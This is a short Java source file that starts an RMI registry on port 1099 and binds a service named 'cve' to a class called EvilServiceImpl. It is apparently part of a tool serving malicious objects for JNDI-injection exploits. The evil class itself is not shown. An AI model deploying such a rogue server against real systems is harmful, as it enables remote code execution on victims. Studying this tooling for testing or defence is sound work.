package com.shudazy.tool.rmi.service;

import com.shudazy.tool.rmi.service.impl.EvilServiceImpl;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

/**
 *
 *
 * @author Bing D. Yee
 * @since 2021/12/13
 */
public class RMIServer {

    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Naming.bind("cve", new EvilServiceImpl());
        System.err.println("RMIServer running...");
        System.in.read();
    }

}
